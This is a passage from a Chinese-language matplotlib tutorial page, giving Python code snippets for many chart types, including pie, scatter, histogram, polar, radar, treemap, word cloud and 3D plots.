：指定指针方向；布尔值，可选参数，默认为：True，即逆时针。将值改为False即可改为顺时针。</td></tr><tr><td>wedgeprops</td><td>字典类型，可选参数，默认值：None。参数字典传递给wedge对象用来画一个饼图。例如：wedgeprops={‘linewidth’:3}设置wedge线宽为3。</td></tr><tr><td>textprops</td><td>设置标签（labels）和比例文字的格式；字典类型，可选参数，默认值为：None。传递给text对象的字典参数。</td></tr><tr><td>center</td><td>浮点类型的列表，可选参数，默认值：(0,0)。图标中心位置。</td></tr><tr><td>frame</td><td>布尔类型，可选参数，默认值：False。如果是true，绘制带有表的轴框架。</td></tr><tr><td>rotatelabels</td><td>布尔类型，可选参数，默认为：False。如果为True，旋转每个label到指定的角度。</td></tr></tbody></table><ul><li>甜甜圈图</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">my_circle = plt.Circle((<span class="number">0</span>, <span class="number">0</span>), <span class="number">0.7</span>, color=<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">d = plt.pie(sizes, labels=labels, autopct=<span class="string">&#x27;%1.1f%%&#x27;</span>,</span><br><span class="line">            startangle=<span class="number">90</span>, labeldistance=<span class="number">1.05</span>)</span><br><span class="line">plt.axis(<span class="string">&#x27;equal&#x27;</span>)</span><br><span class="line">plt.gca().add_artist(my_circle)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>嵌套饼图</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">labels = [<span class="string">&#x27;vegetable&#x27;</span>, <span class="string">&#x27;fruit&#x27;</span>]</span><br><span class="line">sizes = [<span class="number">300</span>, <span class="number">200</span>]</span><br><span class="line">labels_vegefruit = [<span class="string">&#x27;potato&#x27;</span>, <span class="string">&#x27;tomato&#x27;</span>, <span class="string">&#x27;onion&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;durian&#x27;</span>]</span><br><span class="line">sizes_vegefruit = [<span class="number">170</span>, <span class="number">70</span>, <span class="number">60</span>, <span class="number">70</span>, <span class="number">60</span>, <span class="number">50</span>, <span class="number">20</span>]</span><br><span class="line">colors = [<span class="string">&#x27;#FFB600&#x27;</span>, <span class="string">&#x27;#09A0DA&#x27;</span>]</span><br><span class="line">colors_vegefruit = [<span class="string">&#x27;#FFCE53&#x27;</span>, <span class="string">&#x27;#FFDA7E&#x27;</span>, <span class="string">&#x27;#FFE9B2&#x27;</span>, <span class="string">&#x27;#30B7EA&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;#56C7F2&#x27;</span>,<span class="string">&#x27;#7FD6F7&#x27;</span>, <span class="string">&#x27;#B3E7FB&#x27;</span>]</span><br><span class="line">bigger = plt.pie(sizes, labels=labels, colors=colors,</span><br><span class="line">                 startangle=<span class="number">90</span>, frame=<span class="literal">True</span>)</span><br><span class="line">smaller = plt.pie(sizes_vegefruit, labels=labels_vegefruit,</span><br><span class="line">                  colors=colors_vegefruit, radius=<span class="number">0.7</span>,</span><br><span class="line">                  startangle=<span class="number">90</span>, labeldistance=<span class="number">0.7</span>)</span><br><span class="line">centre_circle = plt.Circle((<span class="number">0</span>, <span class="number">0</span>), <span class="number">0.4</span>, color=<span class="string">&#x27;white&#x27;</span>, linewidth=<span class="number">0</span>)</span><br><span class="line">fig = plt.gcf()</span><br><span class="line">fig.gca().add_artist(centre_circle)</span><br><span class="line">plt.axis(<span class="string">&#x27;equal&#x27;</span>)</span><br><span class="line">plt.tight_layout()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="散点图"><a class="markdownIt-Anchor" href="#散点图"></a> 散点图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line">%config InlineBackend.figure_format = <span class="string">&#x27;svg&#x27;</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.scatter(x=range(<span class="number">77</span>, <span class="number">770</span>, <span class="number">10</span>),</span><br><span class="line">            y=np.random.randn(<span class="number">70</span>)*<span class="number">55</span>+range(<span class="number">77</span>, <span class="number">770</span>, <span class="number">10</span>),</span><br><span class="line">            s=<span class="number">200</span>, alpha=<span class="number">0.6</span>)</span><br><span class="line">plt.tick_params(labelsize=<span class="number">12</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Surface(m2)&#x27;</span>, size=<span class="number">12</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Turnover (K dollars)&#x27;</span>, size=<span class="number">12</span>)</span><br><span class="line">plt.xlim(left=<span class="number">0</span>)</span><br><span class="line">plt.ylim(bottom=<span class="number">0</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>连接散点图</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">turnover = [<span class="number">30</span>, <span class="number">38</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">25</span>, <span class="number">27</span>]</span><br><span class="line">plt.plot(np.arange(<span class="number">12</span>), turnover, marker=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>气泡图</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">nbclients = range(<span class="number">10</span>, <span class="number">494</span>, <span class="number">7</span>)</span><br><span class="line">plt.scatter(x=range(<span class="number">77</span>, <span class="number">770</span>, <span class="number">10</span>),</span><br><span class="line">            y=np.random.randn(<span class="number">70</span>)*<span class="number">55</span>+range(<span class="number">77</span>, <span class="number">770</span>, <span class="number">10</span>),</span><br><span class="line">            s=nbclients, alpha=<span class="number">0.6</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>不同颜色的散点图</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">plt.scatter(x=range(<span class="number">40</span>, <span class="number">70</span>, <span class="number">1</span>),</span><br><span class="line">            y=np.abs(np.random.randn(<span class="number">30</span>)*<span class="number">20</span>),</span><br><span class="line">            s=<span class="number">200</span>, </span><br><span class="line">            <span class="comment">#c = &#x27;blue&#x27;,</span></span><br><span class="line">            alpha=<span class="number">0.6</span>,</span><br><span class="line">            label=<span class="string">&#x27;40-69&#x27;</span>)</span><br><span class="line">plt.scatter(x=range(<span class="number">20</span>, <span class="number">40</span>, <span class="number">1</span>),</span><br><span class="line">            y=np.abs(np.random.randn(<span class="number">20</span>)*<span class="number">40</span>),</span><br><span class="line">            s=<span class="number">200</span>,   </span><br><span class="line">            <span class="comment">#c = &#x27;red&#x27;,</span></span><br><span class="line">            alpha=<span class="number">0.6</span>,</span><br><span class="line">            label=<span class="string">&#x27;20-39&#x27;</span>)</span><br><span class="line">plt.legend()  <span class="comment"># 每次都要执行</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="直方图"><a class="markdownIt-Anchor" href="#直方图"></a> 直方图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line">%config InlineBackend.figure_format = <span class="string">&#x27;svg&#x27;</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">gaussian_numbers = np.random.normal(size=<span class="number">10000</span>)</span><br><span class="line">plt.hist(gaussian_numbers)</span><br><span class="line">plt.title(<span class="string">&quot;Gaussian Histogram&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;Value&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;Frequency&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="等值线图"><a class="markdownIt-Anchor" href="#等值线图"></a> 等值线图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line">%config InlineBackend.figure_format = <span class="string">&#x27;svg&#x27;</span></span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.cm <span class="keyword">as</span> cm</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delta = <span class="number">0.025</span></span><br><span class="line">x = np.arange(<span class="number">-3.0</span>, <span class="number">3.0</span>, delta)</span><br><span class="line">y = np.arange(<span class="number">-2.0</span>, <span class="number">2.0</span>, delta)</span><br><span class="line">X, Y = np.meshgrid(x, y)</span><br><span class="line">Z1 = np.exp(-X**<span class="number">2</span> - Y**<span class="number">2</span>)</span><br><span class="line">Z2 = np.exp(-(X - <span class="number">1</span>)**<span class="number">2</span> - (Y - <span class="number">1</span>)**<span class="number">2</span>)</span><br><span class="line">Z = (Z1 - Z2) * <span class="number">2</span></span><br><span class="line">fig, ax = plt.subplots()</span><br><span class="line">CS = ax.contour(X, Y, Z)</span><br><span class="line">ax.clabel(CS, inline=<span class="number">1</span>, fontsize=<span class="number">10</span>)</span><br><span class="line">ax.set_title(<span class="string">&#x27;Simplest default with labels&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="盒须图"><a class="markdownIt-Anchor" href="#盒须图"></a> 盒须图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line">%config InlineBackend.figure_format = <span class="string">&#x27;svg&#x27;</span></span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fixing random state for reproducibility</span></span><br><span class="line">np.random.seed(<span class="number">19680801</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake up some data</span></span><br><span class="line">spread = np.random.rand(<span class="number">50</span>) * <span class="number">100</span></span><br><span class="line">center = np.ones(<span class="number">25</span>) * <span class="number">50</span></span><br><span class="line">flier_high = np.random.rand(<span class="number">10</span>) * <span class="number">100</span> + <span class="number">100</span></span><br><span class="line">flier_low = np.random.rand(<span class="number">10</span>) * <span class="number">-100</span></span><br><span class="line">data = np.concatenate((spread, center, flier_high, flier_low))</span><br><span class="line">fig1, ax1 = plt.subplots()</span><br><span class="line">ax1.set_title(<span class="string">&#x27;Basic Plot&#x27;</span>)</span><br><span class="line">ax1.boxplot(data)</span><br></pre></td></tr></table></figure><h2 id="棉棒图"><a class="markdownIt-Anchor" href="#棉棒图"></a> 棉棒图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line">%config InlineBackend.figure_format = <span class="string">&#x27;svg&#x27;</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.linspace(<span class="number">0.1</span>, <span class="number">2</span> * np.pi, <span class="number">41</span>)</span><br><span class="line">y = np.exp(np.sin(x))</span><br><span class="line">plt.stem(x, y, use_line_collection=<span class="literal">True</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="极坐标图"><a class="markdownIt-Anchor" href="#极坐标图"></a> 极坐标图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># 极坐标下需要的数据有极径和角度</span></span><br><span class="line">r = np.arange(<span class="number">1</span>,<span class="number">6</span>,<span class="number">1</span>)  <span class="comment"># 极径</span></span><br><span class="line">theta = [i*np.pi/<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>)]  <span class="comment">#角度</span></span><br><span class="line"><span class="comment"># 指定画图坐标为极坐标,projection=&#x27;polar&#x27;</span></span><br><span class="line">ax = plt.subplot(<span class="number">111</span>, projection=<span class="string">&#x27;polar&#x27;</span>)</span><br><span class="line">ax.plot(theta,r,linewidth=<span class="number">3</span>,color=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">ax.grid(<span class="literal">True</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="雷达图"><a class="markdownIt-Anchor" href="#雷达图"></a> 雷达图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Libraries</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> pi</span><br><span class="line"><span class="comment"># Set data</span></span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line"><span class="string">&#x27;group&#x27;</span>: [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>],</span><br><span class="line"><span class="string">&#x27;var1&#x27;</span>: [<span class="number">38</span>, <span class="number">1.5</span>, <span class="number">30</span>, <span class="number">4</span>],</span><br><span class="line"><span class="string">&#x27;var2&#x27;</span>: [<span class="number">29</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">34</span>],</span><br><span class="line"><span class="string">&#x27;var3&#x27;</span>: [<span class="number">8</span>, <span class="number">39</span>, <span class="number">23</span>, <span class="number">24</span>],</span><br><span class="line"><span class="string">&#x27;var4&#x27;</span>: [<span class="number">7</span>, <span class="number">31</span>, <span class="number">33</span>, <span class="number">14</span>],</span><br><span class="line"><span class="string">&#x27;var5&#x27;</span>: [<span class="number">28</span>, <span class="number">15</span>, <span class="number">32</span>, <span class="number">14</span>]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># number of variable</span></span><br><span class="line">categories=list(df)[<span class="number">1</span>:]</span><br><span class="line">N = len(categories)</span><br><span class="line"><span class="comment"># We are going to plot the first line of the data frame.</span></span><br><span class="line"><span class="comment"># But we need to repeat the first value to close the circular graph:</span></span><br><span class="line">values=df.loc[<span class="number">0</span>].drop(<span class="string">&#x27;group&#x27;</span>).values.flatten().tolist()</span><br><span class="line">values += values[:<span class="number">1</span>]</span><br><span class="line"><span class="comment"># What will be the angle of each axis in the plot? (we divide the plot / number of variable)</span></span><br><span class="line">angles = [n / float(N) * <span class="number">2</span> * pi <span class="keyword">for</span> n <span class="keyword">in</span> range(N)]</span><br><span class="line">angles += angles[:<span class="number">1</span>] </span><br><span class="line"><span class="comment"># Initialise the spider plot</span></span><br><span class="line">ax = plt.subplot(<span class="number">111</span>, polar=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># Draw one axe per variable + add labels labels yet</span></span><br><span class="line">plt.xticks(angles[:<span class="number">-1</span>], categories, color=<span class="string">&#x27;grey&#x27;</span>, size=<span class="number">8</span>)</span><br><span class="line"><span class="comment"># Draw ylabels</span></span><br><span class="line">ax.set_rlabel_position(<span class="number">0</span>)</span><br><span class="line">plt.yticks([<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>], [<span class="string">&quot;10&quot;</span>,<span class="string">&quot;20&quot;</span>,<span class="string">&quot;30&quot;</span>], color=<span class="string">&quot;grey&quot;</span>, size=<span class="number">7</span>)</span><br><span class="line">plt.ylim(<span class="number">0</span>,<span class="number">40</span>)</span><br><span class="line"><span class="comment"># Plot data</span></span><br><span class="line">ax.plot(angles, values, linewidth=<span class="number">1</span>, linestyle=<span class="string">&#x27;solid&#x27;</span>)</span><br><span class="line"><span class="comment"># Fill area</span></span><br><span class="line">ax.fill(angles, values, <span class="string">&#x27;b&#x27;</span>, alpha=<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><h2 id="极区图"><a class="markdownIt-Anchor" href="#极区图"></a> 极区图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># Fixing random state for reproducibility</span></span><br><span class="line">np.random.seed(<span class="number">19680801</span>)</span><br><span class="line"><span class="comment"># Compute pie slices</span></span><br><span class="line">N = <span class="number">10</span></span><br><span class="line">theta = np.linspace(<span class="number">0.0</span>, <span class="number">2</span> * np.pi, N, endpoint=<span class="literal">False</span>)</span><br><span class="line">radii = <span class="number">10</span> * np.random.rand(N)</span><br><span class="line">width = np.pi / <span class="number">4</span> * np.random.rand(N)</span><br><span class="line">colors = plt.cm.viridis(radii / <span class="number">10.</span>)</span><br><span class="line">ax = plt.subplot(<span class="number">111</span>, projection=<span class="string">&#x27;polar&#x27;</span>)</span><br><span class="line">ax.bar(theta, radii, width=width, bottom=<span class="number">0.0</span>, color=colors, alpha=<span class="number">0.5</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="维恩图"><a class="markdownIt-Anchor" href="#维恩图"></a> 维恩图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib_venn <span class="keyword">import</span> venn2</span><br><span class="line"><span class="comment"># First way to call the 2 group Venn diagram:</span></span><br><span class="line">venn2(subsets = (<span class="number">10</span>, <span class="number">5</span>, <span class="number">2</span>), set_labels = (<span class="string">&#x27;Group A&#x27;</span>, <span class="string">&#x27;Group B&#x27;</span>))</span><br><span class="line">plt.show()</span><br><span class="line"><span class="comment"># Second way</span></span><br><span class="line"><span class="comment">#venn2([set([&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;]), set([&#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;])])</span></span><br><span class="line"><span class="comment">#plt.show()</span></span><br></pre></td></tr></table></figure><h2 id="面状图"><a class="markdownIt-Anchor" href="#面状图"></a> 面状图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">6</span>, <span class="number">4</span>))</span><br><span class="line">turnover = [<span class="number">2</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">25</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">1</span>]</span><br><span class="line">plt.fill_between(np.arange(<span class="number">12</span>), turnover, color=<span class="string">&quot;skyblue&quot;</span>, alpha=<span class="number">0.4</span>)</span><br><span class="line">plt.plot(np.arange(<span class="number">12</span>), turnover, color=<span class="string">&quot;Slateblue&quot;</span>, alpha=<span class="number">0.6</span>, linewidth=<span class="number">2</span>)</span><br><span class="line">plt.tick_params(labelsize=<span class="number">12</span>)</span><br><span class="line">plt.xticks(np.arange(<span class="number">12</span>), np.arange(<span class="number">1</span>,<span class="number">13</span>))</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Month&#x27;</span>, size=<span class="number">12</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Turnover (K dollars) of ice-cream&#x27;</span>, size=<span class="number">12</span>)</span><br><span class="line">plt.ylim(bottom=<span class="number">0</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="树地图"><a class="markdownIt-Anchor" href="#树地图"></a> 树地图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> squarify</span><br><span class="line"><span class="comment">#中文及负号处理办法</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = <span class="string">&#x27;Microsoft YaHei&#x27;</span></span><br><span class="line"><span class="comment">#plt.rcParams[&#x27;axes.unicode_minus&#x27;] = False</span></span><br><span class="line"><span class="comment"># 数据创建</span></span><br><span class="line">name = [<span class="string">&#x27;上海GDP&#x27;</span>,<span class="string">&#x27;北京GDP&#x27;</span>,<span class="string">&#x27;深圳GDP&#x27;</span>,<span class="string">&#x27;广州GDP&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;重庆GDP&#x27;</span>,<span class="string">&#x27;苏州GDP&#x27;</span>,<span class="string">&#x27;成都GDP&#x27;</span>,<span class="string">&#x27;武汉GDP&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;杭州GDP&#x27;</span>,<span class="string">&#x27;天津GDP&#x27;</span>,<span class="string">&#x27;南京GDP&#x27;</span>,<span class="string">&#x27;长沙GDP&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;宁波GDP&#x27;</span>,<span class="string">&#x27;无锡GDP&#x27;</span>,<span class="string">&#x27;青岛GDP&#x27;</span>,<span class="string">&#x27;郑州GDP&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;佛山GDP&#x27;</span>,<span class="string">&#x27;泉州GDP&#x27;</span>,<span class="string">&#x27;东莞GDP&#x27;</span>,<span class="string">&#x27;济南GDP&#x27;</span>]</span><br><span class="line">income =[<span class="number">38155</span>,<span class="number">35371</span>,<span class="number">26927</span>,<span class="number">23628</span>,<span class="number">23605</span>,<span class="number">19235</span>,<span class="number">17012</span>,<span class="number">16900</span>,<span class="number">15373</span>,<span class="number">14104</span>,</span><br><span class="line">          <span class="number">14030</span>,<span class="number">12580</span>,<span class="number">11985</span>,<span class="number">11852</span>,<span class="number">11741</span>,<span class="number">11380</span>,<span class="number">10751</span>,<span class="number">9946</span>,<span class="number">9482</span>,<span class="number">9443</span>]</span><br><span class="line"><span class="comment"># 绘图details</span></span><br><span class="line">colors = [<span class="string">&#x27;steelblue&#x27;</span>,<span class="string">&#x27;#9999ff&#x27;</span>,<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;indianred&#x27;</span>,<span class="string">&#x27;deepskyblue&#x27;</span>,<span class="string">&#x27;lime&#x27;</span>,<span class="string">&#x27;magenta&#x27;</span>,<span class="string">&#x27;violet&#x27;</span>,<span class="string">&#x27;peru&#x27;</span>,  <span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;yellow&#x27;</span>,<span class="string">&#x27;orange&#x27;</span>,<span class="string">&#x27;tomato&#x27;</span>,<span class="string">&#x27;lawngreen&#x27;</span>,<span class="string">&#x27;cyan&#x27;</span>,<span class="string">&#x27;darkcyan&#x27;</span>,<span class="string">&#x27;dodgerblue&#x27;</span>,<span class="string">&#x27;teal&#x27;</span>,<span class="string">&#x27;tan&#x27;</span>,<span class="string">&#x27;royalblue&#x27;</span>]</span><br><span class="line">plot = squarify.plot(sizes = income, <span class="comment"># 指定绘图数据</span></span><br><span class="line">                     label = name, <span class="comment"># 指定标签</span></span><br><span class="line">                     color = colors, <span class="comment"># 指定自定义颜色</span></span><br><span class="line">                     alpha = <span class="number">0.6</span>, <span class="comment"># 指定透明度</span></span><br><span class="line">                     value = income, <span class="comment"># 添加数值标签</span></span><br><span class="line">                     edgecolor = <span class="string">&#x27;white&#x27;</span>, <span class="comment"># 设置边界框为白色</span></span><br><span class="line">                     linewidth =<span class="number">3</span> <span class="comment"># 设置边框宽度为3</span></span><br><span class="line">                    )</span><br><span class="line"><span class="comment"># 设置标签大小为10</span></span><br><span class="line">plt.rc(<span class="string">&#x27;font&#x27;</span>, size=<span class="number">10</span>)</span><br><span class="line"><span class="comment"># 设置标题和字体大小</span></span><br><span class="line">plot.set_title(<span class="string">&#x27;2019年城市GDP排名前20(亿元)&#x27;</span>,fontdict = &#123;<span class="string">&#x27;fontsize&#x27;</span>:<span class="number">15</span>&#125;)</span><br><span class="line"><span class="comment"># 去除坐标轴</span></span><br><span class="line">plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line"><span class="comment"># 除上边框和右边框刻度</span></span><br><span class="line">plt.tick_params(top = <span class="string">&#x27;off&#x27;</span>, right = <span class="string">&#x27;off&#x27;</span>)</span><br><span class="line"><span class="comment"># 图形展示</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="词云图"><a class="markdownIt-Anchor" href="#词云图"></a> 词云图</h2><ul><li>需要安装wordcloud模块：pip install wordcloud</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">text = (<span class="string">&#x27;Data science is an interdisciplinary field that uses scientific methods, processes, algorithms and systems to extract knowledge and insights from data in various forms, both structured and unstructured, similar to data mining. Data science is a concept to unify statistics, data analysis, machine learning and their related methods in order to understand and analyze actual phenomena with data. It employs techniques and theories drawn from many fields within the context of mathematics, statistics, information science, and computer science. Turing award winner Jim Gray imagined data science as a fourth paradigm of science (empirical, theoretical, computational and now data-driven) and asserted that everything about science is changing because of the impact of information technology and the data deluge. In 2012, when Harvard Business Review called it The Sexiest Job of the 21st Century, the term data science became a buzzword. It is now often used interchangeably with earlier concepts like business analytics, business intelligence, predictive modeling, and statistics. Even the suggestion that data science is sexy was paraphrasing Hans Rosling, featured in a 2011 BBC documentary with the quote, Statistics is now the sexiest subject around. Nate Silver referred to data science as a sexed up term for statistics. In many cases, earlier approaches and solutions are now simply rebranded as data science to be more attractive, which can cause the term to become dilute beyond usefulness. While many university programs now offer a data science degree, there exists no consensus on a definition or suitable curriculum contents. To its discredit, however, many data-science and big-data projects fail to deliver useful results, often as a result of poor management and utilization of resources&#x27;</span>)</span><br><span class="line">wordcloud = WordCloud(width=<span class="number">1280</span>, height=<span class="number">853</span>, margin=<span class="number">0</span>, colormap=<span class="string">&#x27;Blues&#x27;</span>).generate(text)</span><br><span class="line">plt.figure(figsize=(<span class="number">13</span>, <span class="number">8.6</span>))</span><br><span class="line">plt.imshow(wordcloud, interpolation=<span class="string">&#x27;bilinear&#x27;</span>)</span><br><span class="line">plt.axis(<span class="string">&quot;off&quot;</span>)</span><br><span class="line">plt.margins(x=<span class="number">0</span>, y=<span class="number">0</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="3d绘图"><a class="markdownIt-Anchor" href="#3d绘图"></a> 3D绘图</h2><ul><li>2D数据</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax = fig.gca(projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line"><span class="comment"># Plot a sin curve using the x and y axes.</span></span><br><span class="line">x = np.linspace(<span class="number">0</span>, <span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">y = np.sin(x * <span class="number">2</span> * np.pi) / <span class="number">2</span> + <span class="number">0.5</span></span><br><span class="line">ax.plot(x, y, zs=<span class="number">0</span>, zdir=<span class="string">&#x27;z&#x27;</span>, label=<span class="string">&#x27;curve in (x, y)&#x27;</span>)</span><br><span class="line"><span class="comment"># Plot scatterplot data (20 2D points per colour) on the x and z axes.</span></span><br><span class="line">colors = (<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;k&#x27;</span>)</span><br><span class="line"><span class="comment"># Fixing random state for reproducibility</span></span><br><span class="line">np.random.seed(<span class="number">19680801</span>)</span><br><span class="line">x = np.random.sample(<span class="number">20</span> * len(colors))</span><br><span class="line">y = np.random.sample(<span class="number">20</span> * len(colors))</span><br><span class="line">c_list = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> colors:</span><br><span class="line">    c_list.extend([c] * <span class="number">20</span>)</span><br><span class="line"><span class="comment"># By using zdir=&#x27;y&#x27;, the y value of these points is fixed to the zs value 0</span></span><br><span class="line"><span class="comment"># and the (x, y) points are plotted on the x and z axes.</span></span><br><span class="line">ax.scatter(x, y, zs=<span class="number">0</span>, zdir=<span class="string">&#x27;y&#x27;</span>, c=c_list, label=<span class="string">&#x27;points in (x, z)&#x27;</span>)</span><br><span class="line"><span class="comment"># Make legend, set axes limits and labels</span></span><br><span class="line">ax.legend()</span><br><span class="line">ax.set_xlim(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">ax.set_ylim(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">ax.set_zlim(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;X&#x27;</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">ax.set_zlabel(<span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line"><span class="comment"># Customize the view angle so it&#x27;s easier to see that the scatter points lie</span></span><br><span class="line"><span class="comment"># on the plane y=0</span></span><br><span class="line">ax.view_init(elev=<span class="number">20.</span>, azim=<span class="number">-35</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>散点图</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> 